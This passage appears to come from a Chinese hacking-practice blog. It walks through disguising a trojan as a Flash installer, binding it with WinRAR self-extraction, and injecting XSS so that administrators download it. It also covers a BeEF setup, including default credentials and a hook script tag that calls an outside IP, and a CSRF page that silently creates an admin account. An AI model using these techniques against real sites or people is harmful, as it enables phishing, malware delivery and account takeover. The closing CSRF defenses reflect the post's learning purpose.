+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCWBD"><img src="https://s3.jpg.cm/2021/10/01/ImCWBD.png" alt="ImCWBD.png"></a></p>
+<p><hanla></hanla>然后我们还要下载一下<hanla></hanla>flash<hanla></hanla>页面</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCnOp"><img src="https://s3.jpg.cm/2021/10/01/ImCnOp.png" alt="ImCnOp.png"></a></p>
+<p>然后把下载好的页面放到我本地搭建的网站</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCQmT"><img src="https://s3.jpg.cm/2021/10/01/ImCQmT.png" alt="ImCQmT.png"></a></p>
+<p>这里我们对比之后只要把，这里修改一下下载的名称就可以了<br>然后需要下载的程序放在网站根目录里面，这里我有点奇怪，只有访问<br><hanla></hanla>127.0.0.1/index.html<hanla></hanla>才能访问到下载的<hanla></hanla>exe<hanla></hanla>程序，用<hanla></hanla>127.0.0.1<hanla></hanla>访问下载就变成了<hanla></hanla>1  27.0.0.1/#奇怪  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCdTE"><img src="https://s3.jpg.cm/2021/10/01/ImCdTE.png" alt="ImCdTE.png"></a></p>
+<p><hanla></hanla>然后我们将木马程序和真实程序绑定在一起，右键添加到<hanla></hanla>winrar<hanla></hanla>程序！！！！一定是<hanla></hanla>winrar<hanla></hanla>程序</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCldQ"><img src="https://s3.jpg.cm/2021/10/01/ImCldQ.png" alt="ImCldQ.png"></a></p>
+<p><hanla></hanla>然后高级自解压选项，我们选择到<hanla></hanla>d<hanla></hanla>盘</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImC6Yh"><img src="https://s3.jpg.cm/2021/10/01/ImC6Yh.png" alt="ImC6Yh.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCVCS"><img src="https://s3.jpg.cm/2021/10/01/ImCVCS.png" alt="ImCVCS.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCUZL"><img src="https://s3.jpg.cm/2021/10/01/ImCUZL.png" alt="ImCUZL.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCcfH"><img src="https://s3.jpg.cm/2021/10/01/ImCcfH.png" alt="ImCcfH.png"></a></p>
+<p><hanla></hanla>然后确定，这个就是我们带有木马的程序了，看起来天衣无缝，然后替换我们<hanla></hanla>vps<hanla></hanla>根目录里面的程序</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCX12"><img src="https://s3.jpg.cm/2021/10/01/ImCX12.png" alt="ImCX12.png"></a></p>
+<p><hanla></hanla>然后去<hanla></hanla>xss<hanla></hanla>平台创建钓鱼模块</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCuAf"><img src="https://s3.jpg.cm/2021/10/01/ImCuAf.png" alt="ImCuAf.png"></a></p>
+<p>然后创建项目<br><hanla></hanla>然后去网站插入<hanla></hanla>xss<hanla></hanla>代码即可</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCAqW"><img src="https://s3.jpg.cm/2021/10/01/ImCAqW.png" alt="ImCAqW.png"></a></p>
+<p>选择我们自定义的钓鱼模块，正常的话应该会让你下载</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImC1pU"><img src="https://s3.jpg.cm/2021/10/01/ImC1pU.png" alt="ImC1pU.png"></a></p>
+<p>然后管理员下载允许我们能拿到会话了</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCHTO"><img src="https://s3.jpg.cm/2021/10/01/ImCHTO.png" alt="ImCHTO.png"></a></p>
+<h3 id="beef-xss"><a href="#beef-xss" class="headerlink" title="beef-xss"></a>beef-xss</h3><p>apt-get install beef-xss</p>
+<p>一个是本地控制端  127.0.0.1:3000/ui/authentication<br><hanla></hanla>账号<hanla></hanla>beef,<hanla></hanla>密码<hanla></hanla>admin<br>192.168.43.217:3000/hook.js</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCtdw"><img src="https://s3.jpg.cm/2021/10/01/ImCtdw.png" alt="ImCtdw.png"></a></p>
+<p><hanla></hanla>dhclient eth0 动态获取<hanla></hanla>ip  </p>
+<pre><code>&lt;script src="http://192.168.43.217:3000/hook.js&gt;&lt;/script&gt;
+</code></pre>
+<p>我以为获取到了，结果什么都不能执行，。。。</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCNr8"><img src="https://s3.jpg.cm/2021/10/01/ImCNr8.png" alt="ImCNr8.png"></a></p>
+<p><hanla></hanla>我们这里只是在内网用，可以找到一个<hanla></hanla>yaml<hanla></hanla>文件，</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCSCi"><img src="https://s3.jpg.cm/2021/10/01/ImCSCi.png" alt="ImCSCi.png"></a></p>
+<p><hanla></hanla>这里我们改成<hanla></hanla>ngrok<hanla></hanla>监听的地址就可以了</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCEfy"><img src="https://s3.jpg.cm/2021/10/01/ImCEfy.png" alt="ImCEfy.png"></a></p>
+<h3 id="xss平台搭建"><a href="#xss平台搭建" class="headerlink" title="xss平台搭建"></a><hanla></hanla>xss<hanla></hanla>平台搭建</h3><p>感觉平台要搞服务器，买一个短域名，啊我先不搭建<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/12176961.html"><hanla></hanla>https://www.cnblogs.com/Cl0ud/p/12176961.html</a></p>
+<h3 id="csrf漏洞"><a href="#csrf漏洞" class="headerlink" title="csrf漏洞"></a><hanla></hanla>csrf<hanla></hanla>漏洞</h3><p><hanla></hanla>CSRF（Cross-site request forgery<hanla></hanla>跨站请求伪造，也被称为<hanla></hanla>“One Click Attack”<hanla></hanla>或者<hanla></hanla>Session Riding，通常缩写为<hanla></hanla>CSRF<hanla></hanla>或者<hanla></hanla>XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与<hanla></hanla>XSS<hanla></hanla>非常不同，并且攻击方式几乎相左。XSS<hanla></hanla>利用站点内的信任用户，而<hanla></hanla>CSRF<hanla></hanla>则通过伪装来自受信任用户的请求来利用受信任的网站。与<hanla></hanla>XSS<hanla></hanla>攻击相比，CSRF<hanla></hanla>攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比<hanla></hanla>XSS<hanla></hanla>更具危险性。<br>比如我们先本地抓一个创建管理员的包</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCmX5"><img src="https://s3.jpg.cm/2021/10/01/ImCmX5.png" alt="ImCmX5.png"></a></p>
+<p>如果用连接发过去太长了，我们发个页面</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCFZr"><img src="https://s3.jpg.cm/2021/10/01/ImCFZr.png" alt="ImCFZr.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCsHe"><img src="https://s3.jpg.cm/2021/10/01/ImCsHe.png" alt="ImCsHe.png"></a></p>
+<p>他如果打开了我们构造的页面，那么他就会创建一个管理员</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImCrqk"><img src="https://s3.jpg.cm/2021/10/01/ImCrqk.png" alt="ImCrqk.png"></a></p>
+<p>防御：<br><hanla></hanla>referer<hanla></hanla>来源<br><hanla></hanla>token<br><hanla></hanla>验证码 </p>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2021 Hongxiaodou
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled"></a-icon></span>
+            @hongxiaodou
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> &amp; <a target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'zh-CN',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+
+
+</body></html>
